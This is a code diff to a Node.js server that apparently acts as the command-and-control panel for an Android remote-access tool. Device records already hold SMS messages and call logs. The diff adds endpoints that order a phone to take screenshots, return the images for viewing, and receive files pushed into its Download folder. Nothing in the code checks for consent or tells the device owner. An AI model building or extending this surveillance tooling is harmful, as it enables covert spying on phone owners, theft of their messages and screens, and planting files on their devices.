@@ -12,6 +12,7 @@ const wss = new WebSocket.Server({ server });
 // Connected devices storage (persistent)
 const connectedDevices = new Map();
 const deviceHistory = new Map(); // Store device history even when offline
+const deviceScreenshots = new Map(); // Store latest screenshots
 
 // Middleware
 app.use(express.json());
@@ -92,6 +93,7 @@ function handleDeviceMessage(ws, message) {
         sms: { messages: [], error: null },
         callLog: [],
         currentPath: '/storage/emulated/0',
+        latestScreenshot: null,
       });
       console.log(`Device registered: ${deviceId}`);
       break;
@@ -131,6 +133,11 @@ function handleDeviceMessage(ws, message) {
       console.log('Call log updated for device');
       break;
       
+    case 'screenshot_response':
+      handleScreenshotResponse(ws, message.data);
+      console.log('Screenshot received from device');
+      break;
+      
     case 'file_download_response':
       // Handle file download - could store temporarily or forward to client
       console.log('File download received for device');
@@ -146,6 +153,23 @@ function updateDeviceData(ws, field, data) {
     if (device.ws === ws) {
       device[field] = data;
       device.lastSeen = new Date();
+      break;
+    }
+  }
+}
+
+function handleScreenshotResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      if (data.imageData) {
+        // Store screenshot data
+        deviceScreenshots.set(deviceId, {
+          data: data.imageData,
+          timestamp: new Date(),
+          format: data.format || 'jpeg'
+        });
+        device.latestScreenshot = new Date();
+      }
       break;
     }
   }
@@ -465,6 +489,100 @@ app.post('/api/devices/:deviceId/download-file', (req, res) => {
   
   res.json({ success: true, message: 'File download request sent' });
 });
+
+app.post('/api/devices/:deviceId/screenshot', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  const quality = req.body.quality || 'medium';
+  
+  device.ws.send(JSON.stringify({
+    type: 'take_screenshot',
+    data: { quality }
+  }));
+  
+  res.json({ success: true, message: 'Screenshot request sent' });
+});
+
+app.get('/api/devices/:deviceId/latest-screenshot', (req, res) => {
+  const screenshot = deviceScreenshots.get(req.params.deviceId);
+  if (!screenshot) {
+    return res.status(404).json({ error: 'No screenshot available' });
+  }
+  
+  // Convert base64 to buffer and send as image
+  const imageBuffer = Buffer.from(screenshot.data, 'base64');
+  res.setHeader('Content-Type', `image/${screenshot.format}`);
+  res.setHeader('Cache-Control', 'no-cache');
+  res.send(imageBuffer);
+});
+
+app.post('/api/devices/:deviceId/upload-file', upload.single('file'), (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  if (!req.file) {
+    return res.status(400).json({ error: 'No file uploaded' });
+  }
+  
+  // Read file and send to device
+  const filePath = req.file.path;
+  const fileData = fs.readFileSync(filePath, { encoding: 'base64' });
+  const targetPath = req.body.targetPath || '/storage/emulated/0/Download';
+  
+  device.ws.send(JSON.stringify({
+    type: 'upload_file',
+    data: {
+      fileName: req.file.originalname,
+      fileData: fileData,
+      targetPath: targetPath,
+      mimeType: req.file.mimetype
+    }
+  }));
+  
+  // Clean up temporary file
+  fs.unlinkSync(filePath);
+  
+  res.json({
+    success: true,
+    message: 'File uploaded to device',
+    fileName: req.file.originalname,
+    size: req.file.size
+  });
+});
+
+app.post('/api/devices/:deviceId/share-file', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  const { filePath } = req.body;
+  
+  device.ws.send(JSON.stringify({
+    type: 'share_file',
+    data: { filePath }
+  }));
+  
+  res.json({ success: true, message: 'File share request sent' });
+});
+
 // File upload endpoint
 app.post('/api/devices/:deviceId/upload', upload.single('file'), (req, res) => {
   if (!req.file) {
